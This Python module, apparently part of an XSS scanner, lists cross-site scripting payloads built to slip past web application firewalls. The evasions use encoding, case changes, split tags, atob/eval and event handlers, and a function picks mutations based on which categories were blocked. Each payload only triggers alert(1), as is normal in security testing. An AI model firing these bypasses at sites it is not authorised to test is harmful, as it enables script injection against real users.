# ─────────────────────────────────────────────
# bypass.py
# Job: Generate bypass suggestions after scan
# Only used when nothing was reflected
# ─────────────────────────────────────────────

BYPASS_MUTATIONS = {
    "basic_script": [
        "<scr\tipt>alert(1)</scr\tipt>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "%253Cscript%253Ealert(1)%253C/script%253E",
        "<script>eval('ale'+'rt(1)')</script>",
    ],
    "img_tags": [
        "<img/src=x/onerror=alert(1)>",
        "<ImG sRc=x OnErRoR=alert(1)>",
        "<img src=x onerror=&#97;lert(1)>",
        "<img src=x onerror=alert(String.fromCharCode(49))>",
    ],
    "svg_tags": [
        "<svg xmlns='http://www.w3.org/2000/svg' onload=alert(1)>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<SVG ONLOAD=alert(1)>",
    ],
    "event_handlers": [
        "<object onerror=alert(1)>",
        "<input type=image src=x onerror=alert(1)>",
        "<div onpointerover=alert(1)>hover</div>",
    ],
    "iframe_tags": [
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<iframe src=data:text/html,<script>alert(1)</script>>",
    ],
    "javascript_uri": [
        "<a href=&#106;avascript:alert(1)>click</a>",
        "<a href='java\tscript:alert(1)'>click</a>",
        "<a href=JAVASCRIPT:alert(1)>click</a>",
    ],
    "encoding": [
        "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        "\u003cscript\u003ealert(1)\u003c/script\u003e",
    ],
    "case_variation": [
        "<ScRiPt>alert(1)</sCrIpT>",
        "<IMG SRC=x ONERROR=alert(1)>",
    ],
    "obfuscation": [
        "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
    ],
}

GENERIC_BYPASSES = [
    "<script>window['ale'+'rt'](1)</script>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "';alert`1`;//",
    "\";alert`1`;//",
    "&#x3C;img&#x20;src&#x3D;x&#x20;onerror&#x3D;alert&#x60;1&#x60;&#x3E;",
]


def generate_bypass_suggestions(results, profile=None):
    """
    Analyse blocked categories and generate targeted bypass suggestions.
    Only called when no reflections were found.
    Returns list of suggestion dicts with payload, reason, confidence.
    """
    blocked = [r for r in results if r.get("verdict") == "BLOCKED"]
    passed  = [r for r in results if r.get("verdict") == "PASSED"]

    if not blocked:
        return []

    suggestions  = []
    seen         = set()
    blocked_cats = set(r.get("category", "uncategorised") for r in blocked)
    passed_cats  = set(r.get("category", "uncategorised") for r in passed)

    # Add historical blocked categories from profile
    if profile and profile.get("blocked_categories"):
        for cat in profile["blocked_categories"]:
            blocked_cats.add(cat)

    # Generate category-specific mutations
    for cat in blocked_cats:
        if cat in passed_cats:
            continue
        for mutation in BYPASS_MUTATIONS.get(cat, []):
            if mutation not in seen:
                seen.add(mutation)
                suggestions.append({
                    "payload"    : mutation,
                    "reason"     : f"Targeted mutation for blocked category: {cat}",
                    "category"   : cat,
                    "confidence" : "medium"
                })

    # Prioritise historically passed payloads
    if profile and profile.get("passed_payloads"):
        for payload in profile["passed_payloads"][:5]:
            if payload not in seen:
                seen.add(payload)
                suggestions.append({
                    "payload"    : payload,
                    "reason"     : "Historically passed this WAF in previous scans",
                    "category"   : "historical",
                    "confidence" : "high"
                })

    # Generic bypasses for aggressive WAFs
    if len(blocked) / len(results) > 0.8:
        for payload in GENERIC_BYPASSES:
            if payload not in seen:
                seen.add(payload)
                suggestions.append({
                    "payload"    : payload,
                    "reason"     : "Aggressive WAF — generic obfuscation bypass",
                    "category"   : "generic",
                    "confidence" : "low"
                })

    return suggestions
